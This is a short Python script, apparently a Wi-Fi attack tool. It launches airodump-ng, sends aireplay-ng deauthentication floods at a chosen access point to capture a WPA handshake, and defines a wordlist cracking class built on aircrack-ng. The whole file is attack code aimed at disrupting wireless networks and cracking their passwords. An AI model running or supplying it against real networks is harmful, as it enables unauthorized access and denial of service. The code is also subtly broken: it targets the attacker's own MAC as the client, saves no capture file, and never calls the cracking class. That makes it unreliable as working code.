import subprocess
import getmac


class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


class WifiScan:
    def __init__(self, adapter):
        self.adapter = adapter

    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
        '''Deauth attack function'''
        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
        subprocess.run(
            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
            check=True)

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")

        # Get the current MAC address
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print("Current MAC address:", current_mac)

        try:
            # Start the capture process in the background
            capture_process = subprocess.Popen(['airodump-ng', self.adapter])

            # Wait for user input to execute the deauth attack
            input("Press Enter to proceed with deauth attack...")

            # Prompt user for deauth attack inputs
            client_bssid = input("[+] Input client BSSID: ")
            deauth_pack = int(input("[+] Input number of deauth packets: "))
            client_mac = getmac.get_mac_address(interface=self.adapter)

            # Execute the deauth attack
            print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
            subprocess.run(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter], check=True)

        except KeyboardInterrupt:
            print("Capture handshake process stopped.")

        finally:
            # Cancel the capture process if it was started
            if capture_process:
                capture_process.terminate()
                capture_process.wait()

    def run_wifi_scan(self):
        try:
            self.capture_handshake()
        except KeyboardInterrupt:
            pass


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()


if __name__ == "__main__":
    main()
